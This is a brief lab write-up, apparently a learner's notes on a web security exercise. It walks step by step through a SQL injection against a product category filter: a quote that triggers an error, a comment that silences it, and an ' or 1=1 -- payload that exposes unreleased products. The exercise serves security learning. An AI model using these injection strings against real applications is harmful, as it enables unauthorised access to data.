## Lab 1


**SQL injection - product category filter**

**Query:**

>    SELECT * FROM products WHERE category = 'Gifts' AND released = 1

**End goal**: 
display details of all products both released and unreleased.

**Analysis**:
The following in a normal query:

>    SELECT * FROM products WHERE category = 'Pets' AND released = 1

The following acuses an internal server error:

>    SELECT * FROM products WHERE category = ''' AND released = 1

The following is run with no error:

>    SELECT * FROM products WHERE category = ''--' AND released = 1

The following will display all products both released and unreleased:

>    SELECT * FROM products WHERE category = '' or 1=1 --'  AND released = 1